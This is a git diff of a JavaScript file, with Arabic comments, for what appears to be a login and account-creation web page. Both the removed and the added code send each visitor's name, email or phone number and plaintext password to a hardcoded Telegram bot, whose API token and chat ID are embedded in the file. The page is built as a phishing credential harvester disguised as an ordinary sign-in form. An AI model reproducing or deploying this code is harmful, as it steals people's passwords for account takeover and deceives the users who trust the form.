@@ -1,27 +1,30 @@
-document.getElementById('signup-form').addEventListener('submit', function (e) {
-    e.preventDefault(); // منع إرسال النموذج بالطريقة التقليدية
+// script.js
+function showCreateAccount() {
+    document.getElementById('login-container').style.display = 'none';
+    document.getElementById('create-account-container').style.display = 'block';
+}
 
-    const username = document.getElementById('username').value;
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+function showLogin() {
+    document.getElementById('create-account-container').style.display = 'none';
+    document.getElementById('login-container').style.display = 'block';
+}
 
-    // إرسال البيانات إلى بوت تيليجرام
-    const message = `اسم المستخدم: ${username}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}`;
+async function sendToTelegram(data) {
     const token = '8420977917:AAFgRHgmBaUNmo4o0QgGD99aIc-UEmlL3X8';
     const chatId = '7383092654';
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    const message = `اسم الشخص: ${data.name}\nالبريد الإلكتروني أو رقم الهاتف: ${data.email}\nكلمة المرور: ${data.password}`;
+    
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    fetch(url)
-        .then(response => {
-            if (response.ok) {
-                alert('تم إرسال البيانات بنجاح!');
-                // يمكنك تنفيذ المزيد من الإجراءات هنا
-            } else {
-                alert('حدث خطأ أثناء إرسال البيانات!');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('حدث خطأ أثناء إرسال البيانات!');
-        });
-});
+    await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML' // يمكنك استخدام HTML أو Markdown
+        }),
+    });
+}
